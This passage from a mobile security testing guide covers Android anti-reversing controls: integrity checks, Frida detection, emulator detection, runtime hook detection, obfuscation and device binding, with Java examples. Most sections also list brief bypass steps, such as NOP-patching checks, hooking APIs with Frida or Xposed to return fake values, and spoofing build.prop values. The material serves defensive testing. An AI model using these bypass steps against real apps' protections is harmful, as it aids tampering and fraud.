        \BuiltInTok{Mac}\NormalTok{ hmac = }\KeywordTok{this}\NormalTok{.}\FunctionTok{createHMAC}\NormalTok{(}\BuiltInTok{SecretKey}\NormalTok{.}\FunctionTok{newKey}\NormalTok{());}
        \KeywordTok{return} \FunctionTok{extractMessage}\NormalTok{(messageWithHMAC, hmac.}\FunctionTok{getMacLength}\NormalTok{());}
\NormalTok{    \}}

    \KeywordTok{private} \DataTypeTok{static} \DataTypeTok{byte}\NormalTok{[] }\FunctionTok{extractMessage}\NormalTok{(}\DataTypeTok{byte}\NormalTok{[] body, }\DataTypeTok{int}\NormalTok{ checksumLength) \{}
        \KeywordTok{if}\NormalTok{ (body.}\FunctionTok{length}\NormalTok{ >= checksumLength) \{}
            \DataTypeTok{byte}\NormalTok{[] message = }\KeywordTok{new} \DataTypeTok{byte}\NormalTok{[body.}\FunctionTok{length}\NormalTok{ {-} checksumLength];}
            \BuiltInTok{System}\NormalTok{.}\FunctionTok{arraycopy}\NormalTok{(body, }\DecValTok{0}\NormalTok{, message, }\DecValTok{0}\NormalTok{, message.}\FunctionTok{length}\NormalTok{);}
            \KeywordTok{return}\NormalTok{ message;}
\NormalTok{        \} }\KeywordTok{else}\NormalTok{ \{}
            \KeywordTok{return} \KeywordTok{new} \DataTypeTok{byte}\NormalTok{[}\DecValTok{0}\NormalTok{];}
\NormalTok{        \}}
\NormalTok{    \}}

    \KeywordTok{private} \DataTypeTok{static} \DataTypeTok{byte}\NormalTok{[] }\FunctionTok{extractChecksum}\NormalTok{(}\DataTypeTok{byte}\NormalTok{[] body, }\DataTypeTok{int}\NormalTok{ checksumLength) \{}
        \KeywordTok{if}\NormalTok{ (body.}\FunctionTok{length}\NormalTok{ >= checksumLength) \{}
            \DataTypeTok{byte}\NormalTok{[] checksum = }\KeywordTok{new} \DataTypeTok{byte}\NormalTok{[checksumLength];}
            \BuiltInTok{System}\NormalTok{.}\FunctionTok{arraycopy}\NormalTok{(body, body.}\FunctionTok{length}\NormalTok{ {-} checksumLength, checksum, }\DecValTok{0}\NormalTok{, checksumLength);}
            \KeywordTok{return}\NormalTok{ checksum;}
\NormalTok{        \} }\KeywordTok{else}\NormalTok{ \{}
            \KeywordTok{return} \KeywordTok{new} \DataTypeTok{byte}\NormalTok{[}\DecValTok{0}\NormalTok{];}
\NormalTok{        \}}
\NormalTok{    \}}

    \DataTypeTok{static}\NormalTok{ \{}
        \BuiltInTok{Security}\NormalTok{.}\FunctionTok{addProvider}\NormalTok{(}\KeywordTok{new} \FunctionTok{BouncyCastleProvider}\NormalTok{());}
\NormalTok{    \}}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

Another way to provide integrity is to sign the byte array you obtained
and add the signature to the original byte array.

\hypertarget{bypassing-file-integrity-checks}{%
\subparagraph{Bypassing File Integrity
Checks}\label{bypassing-file-integrity-checks}}

Bypassing the application-source integrity checks

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Patch the anti-debugging functionality. Disable the unwanted behavior
  by simply overwriting the associated byte-code or native code with NOP
  instructions.
\item
  Use Frida or Xposed to hook file system APIs on the Java and native
  layers. Return a handle to the original file instead of the modified
  file.
\item
  Use the kernel module to intercept file-related system calls. When the
  process attempts to open the modified file, return a file descriptor
  for the unmodified version of the file.
\end{enumerate}

Refer to the
``\href{0x05c-Reverse-Engineering-and-Tampering.md}{Tampering and
Reverse Engineering on Android}'' chapter for examples of patching, code
injection, and kernel modules.

Bypassing the storage integrity checks

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Retrieve the data from the device, as described in the
  ``\protect\hyperlink{testing-device-binding-mstg-resilience-10}{Testing
  Device Binding}'' section.
\item
  Alter the retrieved data and then put it back into storage.
\end{enumerate}

\hypertarget{effectiveness-assessment-2}{%
\paragraph{Effectiveness Assessment}\label{effectiveness-assessment-2}}

\hypertarget{for-application-source-integrity-checks}{%
\subparagraph{For application-source integrity
checks}\label{for-application-source-integrity-checks}}

Run the app in an unmodified state and make sure that everything works.
Apply simple patches to \texttt{classes.dex} and any .so libraries in
the app package. Re-package and re-sign the app as described in the
``Basic Security Testing'' chapter, then run the app. The app should
detect the modification and respond in some way. At the very least, the
app should alert the user and/or terminate. Work on bypassing the
defenses and answer the following questions:

\begin{itemize}
\tightlist
\item
  Can the mechanisms be bypassed trivially (e.g., by hooking a single
  API function)?
\item
  How difficult is identifying the anti-debugging code via static and
  dynamic analysis?
\item
  Did you need to write custom code to disable the defenses? How much
  time did you need?
\item
  What is your assessment of the difficulty of bypassing the mechanisms?
\end{itemize}

\hypertarget{for-storage-integrity-checks}{%
\subparagraph{For storage integrity
checks}\label{for-storage-integrity-checks}}

An approach similar to that for application-source integrity checks
applies. Answer the following questions:

\begin{itemize}
\tightlist
\item
  Can the mechanisms be bypassed trivially (e.g., by changing the
  contents of a file or a key-value)?
\item
  How difficult is getting the HMAC key or the asymmetric private key?
\item
  Did you need to write custom code to disable the defenses? How much
  time did you need?
\item
  What is your assessment of the difficulty of bypassing the mechanisms?
\end{itemize}

\hypertarget{testing-reverse-engineering-tools-detection-mstg-resilience-4}{%
\subsubsection{Testing Reverse Engineering Tools Detection
(MSTG-RESILIENCE-4)}\label{testing-reverse-engineering-tools-detection-mstg-resilience-4}}

\hypertarget{overview-44}{%
\paragraph{Overview}\label{overview-44}}

The presence of tools, frameworks and apps commonly used by reverse
engineers may indicate an attempt to reverse engineer the app. Some of
these tools can only run on a rooted device, while others force the app
into debugging mode or depend on starting a background service on the
mobile phone. Therefore, there are different ways that an app may
implement to detect a reverse engineering attack and react to it,
e.g.~by terminating itself.

\hypertarget{detection-methods}{%
\paragraph{Detection Methods}\label{detection-methods}}

You can detect popular reverse engineering tools that have been
installed in an unmodified form by looking for associated application
packages, files, processes, or other tool-specific modifications and
artifacts. In the following examples, we'll discuss different ways to
detect the Frida instrumentation framework, which is used extensively in
this guide. Other tools, such as Substrate and Xposed, can be detected
similarly. Note that DBI/injection/hooking tools can often be detected
implicitly, through runtime integrity checks, which are discussed below.

For instance, in its default configuration on a rooted device, Frida
runs on the device as frida-server. When you explicitly attach to a
target app (e.g.~via frida-trace or the Frida REPL), Frida injects a
frida-agent into the memory of the app. Therefore, you may expect to
find it there after attaching to the app (and not before). If you check
\texttt{/proc/\textless{}pid\textgreater{}/maps} you'll find the
frida-agent as frida-agent-64.so:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{bullhead}\NormalTok{:/ }\CommentTok{\# cat /proc/18370/maps | grep {-}i frida}
\ExtensionTok{71b6bd6000{-}71b7d62000}\NormalTok{ r{-}xp  /data/local/tmp/re.frida.server/frida{-}agent{-}64.so}
\ExtensionTok{71b7d7f000{-}71b7e06000}\NormalTok{ r{-}{-}p  /data/local/tmp/re.frida.server/frida{-}agent{-}64.so}
\ExtensionTok{71b7e06000{-}71b7e28000}\NormalTok{ rw{-}p  /data/local/tmp/re.frida.server/frida{-}agent{-}64.so}
\end{Highlighting}
\end{Shaded}

The other method (which also works for non-rooted devices) consists of
embedding a \href{https://www.frida.re/docs/gadget/}{frida-gadget} into
the APK and \emph{forcing} the app to load it as one of its native
libraries. If you inspect the app memory maps after starting the app (no
need to attach explicitly to it) you'll find the embedded frida-gadget
as libfrida-gadget.so.

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{bullhead}\NormalTok{:/ }\CommentTok{\# cat /proc/18370/maps | grep {-}i frida}

\ExtensionTok{71b865a000{-}71b97f1000}\NormalTok{ r{-}xp  /data/app/sg.vp.owasp\_mobile.omtg\_android{-}.../lib/arm64/libfrida{-}gadget.so}
\ExtensionTok{71b9802000{-}71b988a000}\NormalTok{ r{-}{-}p  /data/app/sg.vp.owasp\_mobile.omtg\_android{-}.../lib/arm64/libfrida{-}gadget.so}
\ExtensionTok{71b988a000{-}71b98ac000}\NormalTok{ rw{-}p  /data/app/sg.vp.owasp\_mobile.omtg\_android{-}.../lib/arm64/libfrida{-}gadget.so}
\end{Highlighting}
\end{Shaded}

Looking at these two \emph{traces} that Frida \emph{lefts behind}, you
might already imagine that detecting those would be a trivial task. And
actually, so trivial will be bypassing that detection. But things can
get much more complicated. The following table shortly presents a set of
some typical Frida detection methods and a short discussion on their
effectiveness.

\begin{quote}
Some of the following detection methods are presented in the article
\href{http://www.vantagepoint.sg/blog/90-the-jiu-jitsu-of-detecting-frida}{``The
Jiu-Jitsu of Detecting Frida'' by Berdhard Mueller}. Please refer to it
for more details and for example code snippets.
\end{quote}

\begin{longtable}[]{@{}lll@{}}
\toprule
\begin{minipage}[b]{0.30\columnwidth}\raggedright
Method\strut
\end{minipage} & \begin{minipage}[b]{0.30\columnwidth}\raggedright
Description\strut
\end{minipage} & \begin{minipage}[b]{0.30\columnwidth}\raggedright
Discussion\strut
\end{minipage}\tabularnewline
\midrule
\endhead
\begin{minipage}[t]{0.30\columnwidth}\raggedright
\textbf{Checking the App Signature}\strut
\end{minipage} & \begin{minipage}[t]{0.30\columnwidth}\raggedright
In order to embed the frida-gadget within the APK, it would need to be
repackaged and resigned. You could check the signature of the APK when
the app is starting
(e.g.~\href{https://developer.android.com/reference/android/content/pm/PackageManager\#GET_SIGNING_CERTIFICATES}{GET\_SIGNING\_CERTIFICATES}
since API level 28) and compare it to the one you pinned in your
APK.\strut
\end{minipage} & \begin{minipage}[t]{0.30\columnwidth}\raggedright
This is unfortunately too trivial to bypass, e.g.~by patching the APK or
performing system call hooking.\strut
\end{minipage}\tabularnewline
\begin{minipage}[t]{0.30\columnwidth}\raggedright
\textbf{Check The Environment For Related Artifacts}\strut
\end{minipage} & \begin{minipage}[t]{0.30\columnwidth}\raggedright
Artifacts can be package files, binaries, libraries, processes, and
temporary files. For Frida, this could be the frida-server running in
the target (rooted) system (the daemon responsible for exposing Frida
over TCP). Inspect the running services
(\href{https://developer.android.com/reference/android/app/ActivityManager.html\#getRunningServices\%28int\%29}{\texttt{getRunningServices}})
and processes (\texttt{ps}) searching for one whose name is
``frida-server''. You could also walk through the list of loaded
libraries and check for suspicious ones (e.g.~those including ``frida''
in their names).\strut
\end{minipage} & \begin{minipage}[t]{0.30\columnwidth}\raggedright
Since Android 7.0 (API level 24), inspecting the running
services/processes won't show you daemons like the frida-server as it is
not being started by the app itself. Even if it would be possible,
bypassing this would be as easy just renaming the corresponding Frida
artifact (frida-server/frida-gadget/frida-agent).\strut
\end{minipage}\tabularnewline
\begin{minipage}[t]{0.30\columnwidth}\raggedright
\textbf{Checking For Open TCP Ports}\strut
\end{minipage} & \begin{minipage}[t]{0.30\columnwidth}\raggedright
The frida-server process binds to TCP port 27042 by default. Check
whether this port is open is another method of detecting the
daemon.\strut
\end{minipage} & \begin{minipage}[t]{0.30\columnwidth}\raggedright
This method detects frida-server in its default mode, but the listening
port can be changed via a command line argument, so bypassing this is a
little too trivial.\strut
\end{minipage}\tabularnewline
\begin{minipage}[t]{0.30\columnwidth}\raggedright
\textbf{Checking For Ports Responding To D-Bus Auth}\strut
\end{minipage} & \begin{minipage}[t]{0.30\columnwidth}\raggedright
\texttt{frida-server} uses the D-Bus protocol to communicate, so you can
expect it to respond to D-Bus AUTH. Send a D-Bus AUTH message to every
open port and check for an answer, hoping that \texttt{frida-server}
will reveal itself.\strut
\end{minipage} & \begin{minipage}[t]{0.30\columnwidth}\raggedright
This is a fairly robust method of detecting \texttt{frida-server}, but
Frida offers alternative modes of operation that don't require
frida-server.\strut
\end{minipage}\tabularnewline
\begin{minipage}[t]{0.30\columnwidth}\raggedright
\textbf{Scanning Process Memory for Known Artifacts}\strut
\end{minipage} & \begin{minipage}[t]{0.30\columnwidth}\raggedright
Scan the memory for artifacts found in Frida's libraries, e.g.~the
string ``LIBFRIDA'' present in all versions of frida-gadget and
frida-agent. For example, use \texttt{Runtime.getRuntime().exec} and
iterate through the memory mappings listed in \texttt{/proc/self/maps}
or \texttt{/proc/\textless{}pid\textgreater{}/maps} (depending on the
Android version) searching for the string.\strut
\end{minipage} & \begin{minipage}[t]{0.30\columnwidth}\raggedright
This method is a bit more effective, and it is difficult to bypass with
Frida only, especially if some obfuscation has been added and if
multiple artifacts are being scanned. However, the chosen artifacts
might be patched in the Frida binaries. Find the source code on
\href{https://github.com/b-mueller/frida-detection-demo/blob/master/AntiFrida/app/src/main/cpp/native-lib.cpp}{Berdhard
Mueller's GitHub}.\strut
\end{minipage}\tabularnewline
\bottomrule
\end{longtable}

Please remember that this table is far from exhaustive. We could start
talking about \href{https://en.wikipedia.org/wiki/Named_pipe}{named
pipes} (used by frida-server for external communication), detecting
\href{https://en.wikipedia.org/wiki/Trampoline_\%28computing\%29}{trampolines}
(indirect jump vectors inserted at the prologue of functions), which
would \emph{help} detecting Substrate or Frida's Interceptor but, for
example, won't be effective against Frida's Stalker; and many other,
more or less, effective detection methods. Each of them will depend on
whether you're using a rooted device, the specific version of the
rooting method and/or the version of the tool itself. At the end, this
is part of the cat and mouse game of protecting data being processed on
an untrusted environment (an app running in the user device).

\begin{quote}
It is important to note that these controls are only increasing the
complexity of the reverse engineering process. If used, the best
approach is to combine the controls cleverly instead of using them
individually. However, none of them can assure a 100\% effectiveness, as
the reverse engineer will always have full access to the device and will
therefore always win! You also have to consider that integrating some of
the controls into your app might increase the complexity of your app and
even have an impact on its performance.
\end{quote}

\hypertarget{effectiveness-assessment-3}{%
\paragraph{Effectiveness Assessment}\label{effectiveness-assessment-3}}

Launch the app with various reverse engineering tools and frameworks
installed in your test device. Include at least the following: Frida,
Xposed, Substrate for Android, Drozer, RootCloak, Android SSL Trust
Killer.

The app should respond in some way to the presence of those tools. For
example by:

\begin{itemize}
\tightlist
\item
  Alerting the user and asking for accepting liability.
\item
  Preventing execution by gracefully terminating.
\item
  Securely wiping any sensitive data stored on the device.
\item
  Reporting to a backend server, e.g, for fraud detection.
\end{itemize}

Next, work on bypassing the detection of the reverse engineering tools
and answer the following questions:

\begin{itemize}
\tightlist
\item
  Can the mechanisms be bypassed trivially (e.g., by hooking a single
  API function)?
\item
  How difficult is identifying the anti reverse engineering code via
  static and dynamic analysis?
\item
  Did you need to write custom code to disable the defenses? How much
  time did you need?
\item
  What is your assessment of the difficulty of bypassing the mechanisms?
\end{itemize}

The following steps should guide you when bypassing detection of reverse
engineering tools:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Patch the anti reverse engineering functionality. Disable the unwanted
  behavior by simply overwriting the associated byte-code or native code
  with NOP instructions.
\item
  Use Frida or Xposed to hook file system APIs on the Java and native
  layers. Return a handle to the original file, not the modified file.
\item
  Use a kernel module to intercept file-related system calls. When the
  process attempts to open the modified file, return a file descriptor
  for the unmodified version of the file.
\end{enumerate}

Refer to the
``\href{0x05c-Reverse-Engineering-and-Tampering.md}{Tampering and
Reverse Engineering on Android}'' chapter for examples of patching, code
injection, and kernel modules.

\hypertarget{testing-emulator-detection-mstg-resilience-5}{%
\subsubsection{Testing Emulator Detection
(MSTG-RESILIENCE-5)}\label{testing-emulator-detection-mstg-resilience-5}}

\hypertarget{overview-45}{%
\paragraph{Overview}\label{overview-45}}

In the context of anti-reversing, the goal of emulator detection is to
increase the difficulty of running the app on an emulated device, which
impedes some tools and techniques reverse engineers like to use. This
increased difficulty forces the reverse engineer to defeat the emulator
checks or utilize the physical device, thereby barring the access
required for large-scale device analysis.

\hypertarget{emulator-detection-examples}{%
\paragraph{Emulator Detection
Examples}\label{emulator-detection-examples}}

There are several indicators that the device in question is being
emulated. Although all these API calls can be hooked, these indicators
provide a modest first line of defense.

The first set of indicators are in the file \texttt{build.prop}.

\begin{verbatim}
API Method          Value           Meaning
Build.ABI           armeabi         possibly emulator
BUILD.ABI2          unknown         possibly emulator
Build.BOARD         unknown         emulator
Build.Brand         generic         emulator
Build.DEVICE        generic         emulator
Build.FINGERPRINT   generic         emulator
Build.Hardware      goldfish        emulator
Build.Host          android-test    possibly emulator
Build.ID            FRF91           emulator
Build.MANUFACTURER  unknown         emulator
Build.MODEL         sdk             emulator
Build.PRODUCT       sdk             emulator
Build.RADIO         unknown         possibly emulator
Build.SERIAL        null            emulator
Build.USER          android-build   emulator
\end{verbatim}

You can edit the file \texttt{build.prop} on a rooted Android device or
modify it while compiling AOSP from source. Both techniques will allow
you to bypass the static string checks above.

The next set of static indicators utilize the Telephony manager. All
Android emulators have fixed values that this API can query.

\begin{verbatim}
API                                                     Value                   Meaning
TelephonyManager.getDeviceId()                          0's                     emulator
TelephonyManager.getLine1 Number()                      155552155               emulator
TelephonyManager.getNetworkCountryIso()                 us                      possibly emulator
TelephonyManager.getNetworkType()                       3                       possibly emulator
TelephonyManager.getNetworkOperator().substring(0,3)    310                     possibly emulator
TelephonyManager.getNetworkOperator().substring(3)      260                     possibly emulator
TelephonyManager.getPhoneType()                         1                       possibly emulator
TelephonyManager.getSimCountryIso()                     us                      possibly emulator
TelephonyManager.getSimSerial Number()                  89014103211118510720    emulator
TelephonyManager.getSubscriberId()                      310260000000000         emulator
TelephonyManager.getVoiceMailNumber()                   15552175049             emulator
\end{verbatim}

Keep in mind that a hooking framework, such as Xposed or Frida, can hook
this API to provide false data.

\hypertarget{bypassing-emulator-detection}{%
\paragraph{Bypassing Emulator
Detection}\label{bypassing-emulator-detection}}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Patch the emulator detection functionality. Disable the unwanted
  behavior by simply overwriting the associated byte-code or native code
  with NOP instructions.
\item
  Use Frida or Xposed APIs to hook file system APIs on the Java and
  native layers. Return innocent-looking values (preferably taken from a
  real device) instead of the telltale emulator values. For example, you
  can override the \texttt{TelephonyManager.getDeviceID} method to
  return an IMEI value.
\end{enumerate}

Refer to the
``\href{0x05c-Reverse-Engineering-and-Tampering.md}{Tampering and
Reverse Engineering on Android}'' chapter for examples of patching, code
injection, and kernel modules.

\hypertarget{effectiveness-assessment-4}{%
\paragraph{Effectiveness Assessment}\label{effectiveness-assessment-4}}

Install and run the app in the emulator. The app should detect that it
is being executed in an emulator and terminate or refuse to execute the
functionality that's meant to be protected.

Work on bypassing the defenses and answer the following questions:

\begin{itemize}
\tightlist
\item
  How difficult is identifying the emulator detection code via static
  and dynamic analysis?
\item
  Can the detection mechanisms be bypassed trivially (e.g., by hooking a
  single API function)?
\item
  Did you need to write custom code to disable the anti-emulation
  feature(s)? How much time did you need?
\item
  What is your assessment of the difficulty of bypassing the mechanisms?
\end{itemize}

\hypertarget{testing-runtime-integrity-checks-mstg-resilience-6}{%
\subsubsection{Testing Runtime Integrity Checks
(MSTG-RESILIENCE-6)}\label{testing-runtime-integrity-checks-mstg-resilience-6}}

\hypertarget{overview-46}{%
\paragraph{Overview}\label{overview-46}}

Controls in this category verify the integrity of the app's memory space
to defend the app against memory patches applied during runtime. Such
patches include unwanted changes to binary code, byte-code, function
pointer tables, and important data structures, as well as rogue code
loaded into process memory. Integrity can be verified by:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  comparing the contents of memory or a checksum over the contents to
  good values,
\item
  searching memory for the signatures of unwanted modifications.
\end{enumerate}

There's some overlap with the category ``detecting reverse engineering
tools and frameworks'', and, in fact, we demonstrated the
signature-based approach in that chapter when we showed how to search
process memory for Frida-related strings. Below are a few more examples
of various kinds of integrity monitoring.

\hypertarget{runtime-integrity-check-examples}{%
\subparagraph{Runtime Integrity Check
Examples}\label{runtime-integrity-check-examples}}

Detecting tampering with the Java Runtime**

This detection code is from the
\href{https://d3adend.org/blog/?p=589}{dead \&\& end blog}.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{try}\NormalTok{ \{}
  \KeywordTok{throw} \KeywordTok{new} \BuiltInTok{Exception}\NormalTok{();}
\NormalTok{\}}
\KeywordTok{catch}\NormalTok{(}\BuiltInTok{Exception}\NormalTok{ e) \{}
  \DataTypeTok{int}\NormalTok{ zygoteInitCallCount = }\DecValTok{0}\NormalTok{;}
  \KeywordTok{for}\NormalTok{(}\BuiltInTok{StackTraceElement}\NormalTok{ stackTraceElement : e.}\FunctionTok{getStackTrace}\NormalTok{()) \{}
    \KeywordTok{if}\NormalTok{(stackTraceElement.}\FunctionTok{getClassName}\NormalTok{().}\FunctionTok{equals}\NormalTok{(}\StringTok{"com.android.internal.os.ZygoteInit"}\NormalTok{)) \{}
\NormalTok{      zygoteInitCallCount++;}
      \KeywordTok{if}\NormalTok{(zygoteInitCallCount == }\DecValTok{2}\NormalTok{) \{}
\NormalTok{        Log.}\FunctionTok{wtf}\NormalTok{(}\StringTok{"HookDetection"}\NormalTok{, }\StringTok{"Substrate is active on the device."}\NormalTok{);}
\NormalTok{      \}}
\NormalTok{    \}}
    \KeywordTok{if}\NormalTok{(stackTraceElement.}\FunctionTok{getClassName}\NormalTok{().}\FunctionTok{equals}\NormalTok{(}\StringTok{"com.saurik.substrate.MS$2"}\NormalTok{) \&\&}
\NormalTok{        stackTraceElement.}\FunctionTok{getMethodName}\NormalTok{().}\FunctionTok{equals}\NormalTok{(}\StringTok{"invoked"}\NormalTok{)) \{}
\NormalTok{      Log.}\FunctionTok{wtf}\NormalTok{(}\StringTok{"HookDetection"}\NormalTok{, }\StringTok{"A method on the stack trace has been hooked using Substrate."}\NormalTok{);}
\NormalTok{    \}}
    \KeywordTok{if}\NormalTok{(stackTraceElement.}\FunctionTok{getClassName}\NormalTok{().}\FunctionTok{equals}\NormalTok{(}\StringTok{"de.robv.android.xposed.XposedBridge"}\NormalTok{) \&\&}
\NormalTok{        stackTraceElement.}\FunctionTok{getMethodName}\NormalTok{().}\FunctionTok{equals}\NormalTok{(}\StringTok{"main"}\NormalTok{)) \{}
\NormalTok{      Log.}\FunctionTok{wtf}\NormalTok{(}\StringTok{"HookDetection"}\NormalTok{, }\StringTok{"Xposed is active on the device."}\NormalTok{);}
\NormalTok{    \}}
    \KeywordTok{if}\NormalTok{(stackTraceElement.}\FunctionTok{getClassName}\NormalTok{().}\FunctionTok{equals}\NormalTok{(}\StringTok{"de.robv.android.xposed.XposedBridge"}\NormalTok{) \&\&}
\NormalTok{        stackTraceElement.}\FunctionTok{getMethodName}\NormalTok{().}\FunctionTok{equals}\NormalTok{(}\StringTok{"handleHookedMethod"}\NormalTok{)) \{}
\NormalTok{      Log.}\FunctionTok{wtf}\NormalTok{(}\StringTok{"HookDetection"}\NormalTok{, }\StringTok{"A method on the stack trace has been hooked using Xposed."}\NormalTok{);}
\NormalTok{    \}}

\NormalTok{  \}}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

Detecting Native Hooks

By using ELF binaries, native function hooks can be installed by
overwriting function pointers in memory (e.g., Global Offset Table or
PLT hooking) or patching parts of the function code itself (inline
hooking). Checking the integrity of the respective memory regions is one
way to detect this kind of hook.

The Global Offset Table (GOT) is used to resolve library functions.
During runtime, the dynamic linker patches this table with the absolute
addresses of global symbols. \emph{GOT hooks} overwrite the stored
function addresses and redirect legitimate function calls to
adversary-controlled code. This type of hook can be detected by
enumerating the process memory map and verifying that each GOT entry
points to a legitimately loaded library.

In contrast to GNU \texttt{ld}, which resolves symbol addresses only
after they are needed for the first time (lazy binding), the Android
linker resolves all external functions and writes the respective GOT
entries immediately after a library is loaded (immediate binding). You
can therefore expect all GOT entries to point to valid memory locations
in the code sections of their respective libraries during runtime. GOT
hook detection methods usually walk the GOT and verify this.

\emph{Inline hooks} work by overwriting a few instructions at the
beginning or end of the function code. During runtime, this so-called
trampoline redirects execution to the injected code. You can detect
inline hooks by inspecting the prologues and epilogues of library
functions for suspect instructions, such as far jumps to locations
outside the library.

\hypertarget{bypass-and-effectiveness-assessment}{%
\paragraph{Bypass and Effectiveness
Assessment}\label{bypass-and-effectiveness-assessment}}

Make sure that all file-based detection of reverse engineering tools is
disabled. Then, inject code by using Xposed, Frida, and Substrate, and
attempt to install native hooks and Java method hooks. The app should
detect the ``hostile'' code in its memory and respond accordingly.

Work on bypassing the checks with the following techniques:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Patch the integrity checks. Disable the unwanted behavior by
  overwriting the respective byte-code or native code with NOP
  instructions.
\item
  Use Frida or Xposed to hook the APIs used for detection and return
  fake values.
\end{enumerate}

Refer to the
``\href{0x05c-Reverse-Engineering-and-Tampering.md}{Tampering and
Reverse Engineering on Android}'' chapter for examples of patching, code
injection, and kernel modules.

\hypertarget{testing-obfuscation-mstg-resilience-9}{%
\subsubsection{Testing Obfuscation
(MSTG-RESILIENCE-9)}\label{testing-obfuscation-mstg-resilience-9}}

\hypertarget{overview-47}{%
\paragraph{Overview}\label{overview-47}}

Obfuscation is the process of transforming code and data to make it more
difficult to comprehend. It is an integral part of every software
protection scheme. What's important to understand is that obfuscation
isn't something that can be simply turned on or off. Programs can be
made incomprehensible, in whole or in part, in many ways and to
different degrees.

In the test case ``Make Sure That Free Security Features Are Activated
(MSTG-CODE-9)'' in chapter ``Code Quality and Build Settings of Android
Apps'', we describe a few basic obfuscation techniques that are commonly
used on Android with R8 and Pro-Guard.

\hypertarget{effectiveness-assessment-5}{%
\paragraph{Effectiveness Assessment}\label{effectiveness-assessment-5}}

Attempt to decompile the byte-code, disassemble any included library
files, and perform static analysis. At the very least, the app's core
functionality (i.e., the functionality meant to be obfuscated) shouldn't
be easily discerned. Verify that

\begin{itemize}
\tightlist
\item
  meaningful identifiers, such as class names, method names, and
  variable names, have been discarded,
\item
  string resources and strings in binaries are encrypted,
\item
  code and data related to the protected functionality is encrypted,
  packed, or otherwise concealed.
\end{itemize}

For a more detailed assessment, you need a detailed understanding of the
relevant threats and the obfuscation methods used.

\hypertarget{testing-device-binding-mstg-resilience-10}{%
\subsubsection{Testing Device Binding
(MSTG-RESILIENCE-10)}\label{testing-device-binding-mstg-resilience-10}}

\hypertarget{overview-48}{%
\paragraph{Overview}\label{overview-48}}

The goal of device binding is to impede an attacker who tries to both
copy an app and its state from device A to device B and continue
executing the app on device B. After device A has been determined
trustworthy, it may have more privileges than device B. These
differential privileges should not change when an app is copied from
device A to device B.

Before we describe the usable identifiers, let's quickly discuss how
they can be used for binding. There are three methods that allow device
binding:

\begin{itemize}
\item
  Augmenting the credentials used for authentication with device
  identifiers. This make sense if the application needs to
  re-authenticate itself and/or the user frequently.
\item
  Encrypting the data stored in the device with the key material which
  is strongly bound to the device can strengthen the device binding. The
  Android Keystore offers non-exportable private keys which we can use
  for this. When a malicious actor would extract such data from a
  device, it wouldn't be possible to decrypt the data, as the key is not
  accessible. Implementing this, takes the following steps:

  \begin{itemize}
  \item
    Generate the key pair in the Android Keystore using
    \texttt{KeyGenParameterSpec} API.

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{//Source: <https://developer.android.com/reference/android/security/keystore/KeyGenParameterSpec.html>}
\BuiltInTok{KeyPairGenerator}\NormalTok{ keyPairGenerator = }\BuiltInTok{KeyPairGenerator}\NormalTok{.}\FunctionTok{getInstance}\NormalTok{(}
\NormalTok{        KeyProperties.}\FunctionTok{KEY\_ALGORITHM\_RSA}\NormalTok{, }\StringTok{"AndroidKeyStore"}\NormalTok{);}
\NormalTok{keyPairGenerator.}\FunctionTok{initialize}\NormalTok{(}
        \KeywordTok{new}\NormalTok{ KeyGenParameterSpec.}\FunctionTok{Builder}\NormalTok{(}
                \StringTok{"key1"}\NormalTok{,}
\NormalTok{                KeyProperties.}\FunctionTok{PURPOSE\_DECRYPT}\NormalTok{)}
\NormalTok{                .}\FunctionTok{setDigests}\NormalTok{(KeyProperties.}\FunctionTok{DIGEST\_SHA256}\NormalTok{, KeyProperties.}\FunctionTok{DIGEST\_SHA512}\NormalTok{)}
\NormalTok{                .}\FunctionTok{setEncryptionPaddings}\NormalTok{(KeyProperties.}\FunctionTok{ENCRYPTION\_PADDING\_RSA\_OAEP}\NormalTok{)}
\NormalTok{                .}\FunctionTok{build}\NormalTok{());}
\BuiltInTok{KeyPair}\NormalTok{ keyPair = keyPairGenerator.}\FunctionTok{generateKeyPair}\NormalTok{();}
\BuiltInTok{Cipher}\NormalTok{ cipher = }\BuiltInTok{Cipher}\NormalTok{.}\FunctionTok{getInstance}\NormalTok{(}\StringTok{"RSA/ECB/OAEPWithSHA{-}256AndMGF1Padding"}\NormalTok{);}
\NormalTok{cipher.}\FunctionTok{init}\NormalTok{(}\BuiltInTok{Cipher}\NormalTok{.}\FunctionTok{DECRYPT\_MODE}\NormalTok{, keyPair.}\FunctionTok{getPrivate}\NormalTok{());}
\NormalTok{...}

\CommentTok{// The key pair can also be obtained from the Android Keystore any time as follows:}
\BuiltInTok{KeyStore}\NormalTok{ keyStore = }\BuiltInTok{KeyStore}\NormalTok{.}\FunctionTok{getInstance}\NormalTok{(}\StringTok{"AndroidKeyStore"}\NormalTok{);}
\NormalTok{keyStore.}\FunctionTok{load}\NormalTok{(}\KeywordTok{null}\NormalTok{);}
\BuiltInTok{PrivateKey}\NormalTok{ privateKey = (}\BuiltInTok{PrivateKey}\NormalTok{) keyStore.}\FunctionTok{getKey}\NormalTok{(}\StringTok{"key1"}\NormalTok{, }\KeywordTok{null}\NormalTok{);}
\BuiltInTok{PublicKey}\NormalTok{ publicKey = keyStore.}\FunctionTok{getCertificate}\NormalTok{(}\StringTok{"key1"}\NormalTok{).}\FunctionTok{getPublicKey}\NormalTok{();}
\end{Highlighting}
\end{Shaded}
  \item
    Generating a secret key for AES-GCM:

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{//Source: <https://developer.android.com/reference/android/security/keystore/KeyGenParameterSpec.html>}
\BuiltInTok{KeyGenerator}\NormalTok{ keyGenerator = }\BuiltInTok{KeyGenerator}\NormalTok{.}\FunctionTok{getInstance}\NormalTok{(}
